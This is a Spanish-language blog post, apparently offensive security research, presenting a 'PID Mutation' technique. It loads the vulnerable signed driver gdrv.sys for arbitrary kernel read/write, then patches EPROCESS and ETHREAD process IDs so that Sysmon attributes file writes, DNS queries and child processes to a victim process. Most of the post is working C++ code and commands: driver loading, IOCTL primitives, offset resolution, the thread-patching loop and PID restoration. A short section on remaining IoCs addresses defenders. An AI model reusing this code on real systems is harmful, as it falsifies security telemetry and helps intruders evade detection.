# PID Mutation: Engañando a Sysmon Parcheando EPROCESS y ETHREAD


Buenas a todos, hoy veremos cómo parchear estructuras del kernel en tiempo de ejecución para que Sysmon atribuya toda tu actividad a otro proceso. Antes de entrar en la técnica, vamos a cubrir los conceptos base que necesitas entender si no has trabajado antes con el kernel de Windows.

---

## Conceptos previos

### ¿Qué es un primitivo de lectura/escritura en kernel?

Un primitivo de lectura/escritura en kernel (kernel R/W primitive) es la capacidad de leer y escribir memoria arbitraria del kernel desde user mode. En condiciones normales, un proceso de usuario no puede tocar la memoria del kernel, el procesador lo impide por hardware (ring 0 vs ring 3).

Pero si tienes un driver cargado en el sistema que expone IOCTLs sin validación correcta de los punteros que recibe, puedes llamar a esos IOCTLs desde tu proceso para que el driver (que sí corre en ring 0) haga las lecturas y escrituras por ti.

En la práctica: tu proceso en user mode llama `DeviceIoControl()` con una dirección del kernel como argumento. El driver la acepta sin validar y copia memoria hacia/desde esa dirección. Resultado: tienes R/W arbitraria en el kernel con cero privilegios adicionales.

Esto es el núcleo de la mayoría de técnicas BYOVD.

---

### ¿Qué es BYOVD?

BYOVD (Bring Your Own Vulnerable Driver) consiste en cargar tú mismo un driver legítimo pero con vulnerabilidades conocidas para obtener ejecución en kernel o, en este caso, un primitivo R/W

El driver no es malware. Es un driver real, firmado, que en algún momento fue distribuido por un fabricante legítimo. La vulnerabilidad está en que expone operaciones de memoria sin las validaciones adecuadas.

Windows requiere que todos los drivers estén firmados digitalmente (Driver Signature Enforcement, DSE). Los drivers vulnerables de BYOVD ya están firmados, por lo que los puedes cargar sin desactivar DSE ni hacer nada especial, solo necesitas permisos de administrador.

---

### ¿Cómo encuentro un driver vulnerable? LOLDrivers

[loldrivers.io](https://www.loldrivers.io) es el repositorio de referencia para drivers vulnerables. Mantiene una lista curada con:

- Nombre del driver y proveedor original
- CVE o vulnerabilidad asociada
- Hash SHA256 del archivo
- Categoría: si es un driver con primitivo R/W, con ejecución en kernel, o usado para kill de procesos

Para este PoC necesitas un driver con **primitivo de lectura/escritura en kernel**. En loldrivers puedes filtrar por categoría `Read+Write` para encontrarlos.

Yo he usado el siguiente:
[gdrv.sys](https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/)

Una vez tienes el `.sys`, lo cargas así desde tu código:

```cpp
// Copiar el driver a disco
// (en un PoC real suele ir embebido como recurso o en una ruta temporal)

SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
SC_HANDLE hSvc = CreateService(
    hSCM,
    L"VulnDriver",          // nombre del servicio
    L"VulnDriver",
    SERVICE_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
    L"C:\\Windows\\Temp\\vuln.sys",  // ruta al .sys
    NULL, NULL, NULL, NULL, NULL
);
StartService(hSvc, 0, NULL);

// Obtener handle al dispositivo que expone el driver
HANDLE drv = CreateFile(
    L"\\\\.\\VulnDriverDevice",
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);
```

O más fácil, desde un par de simples comandos en un CMD como Administrador:

```cpp
sc create gdrv binpath="C:\Path\toYour.sys" type="kernel"
sc start gdrv
```

Y luego `ReadPrimitive` / `WritePrimitive` son wrappers sobre `DeviceIoControl` con los IOCTLs específicos del driver que hayas elegido. La implementación exacta depende del driver, cada uno expone sus propios códigos IOCTL y espera los argumentos en un formato concreto.

En el caso del driver que he escogido, estas son las primitivas que explotan el read y el write:

```cpp
#include <iostream>
#include <Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/

#define IOCTL_READWRITE_PRIMITIVE 0xC3502808

using namespace std;

typedef struct KernelWritePrimitive {
	LPVOID dst;
	LPVOID src;
	DWORD size;
} KernelWritePrimitive;

typedef struct KernelReadPrimitive {
	LPVOID dst;
	LPVOID src;
	DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
	KernelWritePrimitive kwp;
	kwp.dst = dst;
	kwp.src = src;
	kwp.size = size;

	BYTE bufferReturned[48] = { 0 };
	DWORD returned = 0;
	BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
	if (!result) {
		cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
		return FALSE;
	}
	cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
	return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
	KernelReadPrimitive krp;
	krp.dst = dst;
	krp.src = src;
	krp.size = size;


	DWORD returned = 0;

	BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
	if (!result) {
		cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
		return FALSE;
	}
	return TRUE;
}

HANDLE openVulnDriver() {
	HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!driver || driver == INVALID_HANDLE_VALUE)
	{
		cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
		return NULL;
	}
	return driver;
}
```
---

## La técnica: PID Mutation

### Cómo Windows trackea la identidad de un proceso

Windows mantiene el PID de un proceso en tres lugares independientes del kernel:

**`EPROCESS.UniqueProcessId`:** El campo PID dentro del objeto proceso del kernel. Las herramientas que recorren `PsActiveProcessLinks` (la lista doblemente enlazada de procesos activos) leen de aquí. Task Manager, Process Hacker y System Informer usan esta fuente.

**`PspCidTable`**: Una tabla de handles del kernel indexada por `PID/4`. Esta es la fuente autoritativa para el kernel. `NtOpenProcess`, operaciones con handles y la mayoría de callbacks del kernel usan `PspCidTable` para resolver un PID a su `EPROCESS`. Cuando Sysmon recibe un callback con un PID y quiere resolver la imagen del proceso, consulta aquí.

**`ETHREAD.Cid.UniqueProcess`**: Cada thread lleva su propia copia del PID del proceso al que pertenece, en el campo `CLIENT_ID.UniqueProcess`. Los callbacks ETW del kernel, los callbacks de minifilter, y el driver de Sysmon leen de aquí para saber qué proceso originó una operación, no leen de `EPROCESS` directamente.

El punto clave: **estas tres fuentes son independientes**. Parchear una no actualiza automáticamente las otras.

---

### El ataque

Parcheando `EPROCESS.UniqueProcessId` y `ETHREAD.Cid.UniqueProcess` en todos los threads de tu proceso, consigues que Sysmon atribuya toda tu actividad: escrituras de ficheros, queries DNS, procesos hijo, terminación, al proceso que elijas. La telemetría resuelve la imagen incorrecta, el padre incorrecto, y construye un árbol de procesos completamente falso.

---

## Implementación

### Paso 1: Resolver offsets dinámicamente

No hardcodeamos offsets. Usamos DbgHelp para resolverlos desde los símbolos de Windows, lo que hace el código compatible con distintas builds:

```cpp
struct KernelOffsets {
    DWORD UniqueProcessId;
    DWORD ActiveProcessLinks;
    DWORD ThreadListHead;
    DWORD ThreadListEntry;
    DWORD Cid;
    DWORD PsInitialSystemProcess;
};

KernelOffsets ResolveOffsets(DWORD64 ntoskrnlBase) {
    HANDLE hSym = GetCurrentProcess();
    SymInitialize(hSym, NULL, FALSE);
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);

    char symPath[512];
    snprintf(symPath, sizeof(symPath), "srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols");
    SymSetSearchPath(hSym, symPath);

    DWORD64 modBase = SymLoadModuleEx(hSym, NULL, "ntoskrnl.exe", NULL,
        ntoskrnlBase, 0, NULL, 0);

    KernelOffsets out = {};
    out.UniqueProcessId    = ResolveFieldOffset(hSym, modBase, "_EPROCESS", "UniqueProcessId");
    out.ActiveProcessLinks = ResolveFieldOffset(hSym, modBase, "_EPROCESS", "ActiveProcessLinks");
    out.ThreadListHead     = ResolveFieldOffset(hSym, modBase, "_EPROCESS", "ThreadListHead");
    out.ThreadListEntry    = ResolveFieldOffset(hSym, modBase, "_ETHREAD",  "ThreadListEntry");
    out.Cid                = ResolveFieldOffset(hSym, modBase, "_ETHREAD",  "Cid");
    out.PsInitialSystemProcess = ResolveSymbolRva(hSym, modBase, "PsInitialSystemProcess");

    return out;
}
```

---

### Paso 2: Encontrar tu EPROCESS

Recorremos `PsActiveProcessLinks` desde `PsInitialSystemProcess` (PID 4, System) hasta encontrar nuestro propio proceso por PID:

```cpp
DWORD64 FindEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, KernelOffsets& g_offsets, DWORD targetPid) {
    DWORD64 psInitSysProc = ntoskrnlBase + g_offsets.PsInitialSystemProcess;
    DWORD64 systemEPROCESS = 0;
    ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)psInitSysProc, sizeof(DWORD64));

    DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
    DWORD64 currentFlink = 0;
    ReadPrimitive(drv, &currentFlink, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));

    DWORD64 current = currentFlink;
    int count = 0;

    while (current != headList && count < 1000) {
        count++;
        DWORD64 eprocess = current - g_offsets.ActiveProcessLinks;
        DWORD64 pid = 0;
        ReadPrimitive(drv, &pid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD64));

        if ((DWORD)pid == targetPid)
            return eprocess;

        ReadPrimitive(drv, &current, (LPVOID)(uintptr_t)current, sizeof(DWORD64));
    }
    return 0;
}
```

---

### Paso 3: Parchear EPROCESS.UniqueProcessId

Sobreescribimos el campo PID con el PID del proceso víctima (en el PoC, Notepad.exe):

```cpp
DWORD64 newValue = targetPid;
WritePrimitive(drv,
    (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId),
    &newValue, sizeof(newValue));
```

Después de este write, las herramientas que recorren `PsActiveProcessLinks` verán el PID mutado. Pero Sysmon todavía reporta el PID original, porque lee de `ETHREAD.Cid`, no de `EPROCESS`.

---

### Paso 4: Parchear todos los ETHREAD.Cid.UniqueProcess

Este es el paso crítico. Recorremos `EPROCESS.ThreadListHead` y para cada ETHREAD sobreescribimos `Cid.UniqueProcess`:

```cpp
void MutateAllThreadCids(HANDLE drv, DWORD64 eprocess, DWORD64 newPid, KernelOffsets& g_offsets) {
    DWORD64 headAddr = eprocess + g_offsets.ThreadListHead;
    DWORD64 currentFlink = 0;
    ReadPrimitive(drv, &currentFlink, (LPVOID)(uintptr_t)headAddr, sizeof(DWORD64));

    DWORD64 current = currentFlink;
    int count = 0;

    while (current != headAddr && count < 1000) {
        count++;
        DWORD64 ethread = current - g_offsets.ThreadListEntry;

        WritePrimitive(drv,
            (LPVOID)(uintptr_t)(ethread + g_offsets.Cid),
            &newPid, sizeof(DWORD64));

        DWORD64 nextFlink = 0;
        ReadPrimitive(drv, &nextFlink, (LPVOID)(uintptr_t)current, sizeof(DWORD64));
        current = nextFlink;
    }
}
```

`CLIENT_ID.UniqueProcess` está en el offset `+0` del campo `Cid`, así que escribir en `ethread + g_offsets.Cid` parchea exactamente el campo correcto.

---

### Paso 5: Restaurar el PID antes de salir

Si no restauras el PID antes de que el proceso termine, el Event ID 5 de Sysmon (process terminated) mostrará el PID de Notepad, y cuando el Notepad real cierre, no generará Event ID 5. Dos anomalías detectables.

Restauramos el PID original justo antes de exit:

```cpp
void RestorePID(HANDLE drv, DWORD64 eprocess, DWORD originalPid, KernelOffsets& g_offsets) {
    DWORD64 restorePid = (DWORD64)originalPid;

    WritePrimitive(drv,
        (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId),
        &restorePid, sizeof(restorePid));

    // Restaurar también todos los ETHREAD.Cid...
    MutateAllThreadCids(drv, eprocess, restorePid, g_offsets);
}
```

---

## Proof of Concept , Sysmon

Probado contra Sysmon v15.21 en Windows 11 24H2. Proceso objetivo: `Notepad.exe` (PID 10720). El PoC muta su propio PID (originalmente 4624) a 10720 y parchea los cuatro threads.

**Event ID 11: File Create**

![Primera imagen](/images/fielwritePIDMutation.png)


**Event ID 22: DNS Query**

![Segunda imagen](/images/DNSqueryPIDMutation.png)

La resolución DNS se atribuye a Notepad.

**Event ID 1: Child Process (cmd.exe)**

![Tercera imagen](/images/notepadProcCreatePIDMutation.png)

---

## Por qué funciona

El driver minifilter de Sysmon recibe callbacks IRP del kernel. Cuando se procesa un IRP, el kernel proporciona el contexto del thread que lo originó,  específicamente `ETHREAD.Cid.UniqueProcess`, como identificador del proceso. Sysmon entonces resuelve la imagen del proceso desde `PspCidTable` usando ese PID.

Como tanto `ETHREAD.Cid` como (indirectamente a través del PID) `PspCidTable` apuntan ahora al PID de Notepad, cada resolución devuelve Notepad. Sysmon nunca lee `EPROCESS.UniqueProcessId` directamente para la atribución de eventos.

---

## IoCs restantes

Esta técnica no es indetectable. Los artefactos que quedan:

**Double termination**: Si no restauras el PID antes de salir, tanto tu proceso como el Notepad real generan un Event ID 5 con el mismo ProcessGuid. Dos eventos terminate para el mismo GUID es detectable.

**Divergencia ETHREAD.Cid vs PspCidTable**: EDRs con sus propios callbacks en kernel que crucen `EPROCESS.UniqueProcessId` contra `PspCidTable` pueden detectar la inconsistencia. Los EDRs de nivel enterprise probablemente hacen esto.

---

## Limitaciones

- Requiere un primitivo R/W en kernel (BYOVD en este PoC)
- `NtCreateProcess` y otras syscalls que se auto referencian fallan tras la mutación, el kernel valida `PspCidTable` en la creación de procesos
- No parchea `PspCidTable` directamente, solo es efectivo contra herramientas que leen de `ETHREAD.Cid`
- Sin sincronización alrededor del write, posible race condition bajo carga de scheduling elevada

---

## Conclusión

Lo que empezó como curiosidad sobre estructuras del kernel resultó en una técnica práctica para falsa atribución en telemetría de Sysmon. El takeaway para defensores: la atribución de procesos en Sysmon depende de `ETHREAD.Cid`, que es independiente tanto de `EPROCESS.UniqueProcessId` como de `PspCidTable`. Parchear las tres fuentes  (o detectar divergencias entre ellas) es lo que separa un EDR robusto de una herramienta que puede ser engañada con unos pocos writes en kernel

El PoC está disponible en: [github.com/S12cybersecurity/PIDMutation](https://github.com/S12cybersecurity/PIDMutation)

Post original en inglés: [medium.com/@s12deff/process-id-mutation-via-byovd](https://medium.com/@s12deff/process-id-mutation-via-byovd)

---

*Probado en Windows 11 24H2, Sysmon v15.21.*
